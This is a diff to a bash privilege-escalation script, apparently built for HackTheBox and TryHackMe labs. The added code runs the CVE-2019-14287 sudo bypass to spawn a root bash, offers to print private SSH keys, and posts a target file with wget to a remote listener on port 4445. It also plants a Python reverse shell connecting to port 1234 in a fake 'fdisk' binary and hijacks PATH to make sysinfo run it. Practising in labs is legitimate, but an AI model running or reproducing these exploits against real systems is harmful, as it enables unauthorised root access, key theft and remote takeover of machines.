@@ -2,26 +2,37 @@
 
 echo "-------Built for users who are trying to do some privesc on hackthebox or tryhackme with less output and some automated privesc tasks.------------"
 echo "-----------Github nk3sec-----------"
+echo "-----------Twitter @natekelly56-----------"
+echo "-----------Tested on Linux Privesc Playground, Sudo Security Bypass, and  on tryhackme---------"
+echo
 echo
 uname -a
 whoami
 echo  "Trying sudo -l. Please enter that password if you know it"
 sudo -l
 echo "Trying CVE-2019-14287. Sudo vulnerability."
-sudo -u#4294967295 id -u
-sudo -u#-1 id -u
+sudo -u#4294967295 /bin/bash
+sudo -u#-1 /bin/bash
+if sudo -u#4294967295 /bin/bash;
+then
+exit 1
+elif sudo -u#-1 /bin/bash;
+then
+exit 1
+else
+echo "Looks like CVE-2019-14287 has been patched on this machine..."
+fi
 echo
 echo  "Searching for ssh files in the user's directory..."
 find $HOME -name ".ssh" -ls
 ls -la $HOME/.ssh
 if ls -la "$HOME/.ssh" | grep authorized_keys;
 then
-echo -n "Would you like me to cat the authorized_keys(1), id_rsa(2), or id_rsa.pub(3) files?: "
+echo -n "Would you like me to cat the authorized_keys(1), id_rsa(2), id_rsa.pub(3) files, or all? (1, 2, 3, all, or n): "
 read RSA
 	if [[ $RSA =~ ^[1]$ ]]
 	then
 	cat $HOME/.ssh/authorized_keys
-	sleep 3
 	else
 	echo ""
 	fi
@@ -33,6 +44,14 @@ read RSA
 		then
 		cat $HOME/.ssh/id_rsa.pub
 		sleep 3
+			elif [[ $RSA == "all" ]]
+			then
+			cat $HOME/.ssh/id_rsa.pub
+			echo
+			cat $HOME/.ssh/authorized_keys
+			echo
+			cat $HOME/.ssh/id_rsa
+			sleep 3
 		else
 		echo ""
 		fi
@@ -93,7 +112,8 @@ echo "------------------Even if none of the possible privesc commands are not fo
 		then
 		echo "Trying privesc with /usr/bin/tail..."
 		/usr/bin/tail $FLAG
-		else
+		elif /usr/bin/tail $FLAG;
+		then
 		echo ""
 		fi
 	else
@@ -114,6 +134,7 @@ echo "------------------Even if none of the possible privesc commands are not fo
 		echo "Get ready to check your nc listener!"
 		echo "If this works, it will of course stop this script. Just hit ctrl+c to on your nc listener if you wish to continue."
 		/usr/bin/wget --post-file=$FLAG http://$ADDRESS:4445
+		exit 1
 		fi
 	else
 	echo "---------WGET DOES NOT WORK----------"
@@ -127,6 +148,7 @@ echo "------------------Even if none of the possible privesc commands are not fo
 		then
 		echo "Trying privesc with /usr/bin/base64..."
 		/usr/bin/base64 $FLAG | base64 --decode
+		exit 1
 		fi
 	else
 	echo "---------BASE64 DOES NOT WORK----------"
@@ -140,6 +162,7 @@ echo "------------------Even if none of the possible privesc commands are not fo
 		then
 		echo "Trying privesc with /usr/bin/cut"
 		/usr/bin/cut -d "" -f1 $FLAG
+		exit 1
 		fi
 	else
 	echo "---------CUT DOES NOT WORK---------"
@@ -153,11 +176,49 @@ echo "------------------Even if none of the possible privesc commands are not fo
                 then
                 echo "Trying privesc with /usr/bin/ul"
                 /usr/bin/ul $FLAG
+		exit 1
                 fi
         else
         echo "---------UL DOES NOT WORK---------"
         fi
+	if grep -q /bin/sysinfo ".file"
+	then
+	echo "Found /bin/sysinfo"
+	echo -n "Would you like me to try and elevate your privileges with /bin/sysinfo?: "
+	read INFO
+		if [[ $INFO =~ ^[Yy]$ ]]
+		then
+		mkdir /tmp/folder
+		cd /tmp/folder
+		touch fdisk
+		#Inserting shell from pentest monkey
+		#Need to test
+		#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LISTEN",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+		echo -n "Enter your remote address here: "
+		read LISTEN
+		echo "Also start a nc listener on port 1234"
+		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($LISTEN,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > /tmp/folder/fdisk
+		export PATH=/tmp/folder:$PATH
+		sysinfo
+		fi
+	else
+	echo "---------SYSINFO DOES NOT WORK---------"
+	fi
+	if grep -q /usr/bin/file ".file";
+	then
+	echo "Found /usr/bin/file"
+	echo "Would you like me to elevate your privileges with /usr/bin/file?: "
+	read FILE1
+		if [[ $FILE1 = ^[Yy]$ ]]
+		then
+		echo "Trying privesc with /usr/bin/file"
+		/usr/bin/file -m $FLAG
+		fi
+	else
+	echo "---------FILE DOES NOT WORK---------"
+	fi
 echo
+
 echo "Searching for python, perl, nc, wget, and curl to see if they are on here for your convenience..."
 which python
 which python3
@@ -167,5 +228,12 @@ which wget
 which curl
 sleep 2
 echo
-
+#Option to copy results or ssh keys over to remote machine. 
 rm .file
+echo "Seeing if we can cd into root..."
+if cd /root;
+then
+echo "We can cd into root!"
+else
+echo "Looks like we can not cd into root..."
+fi
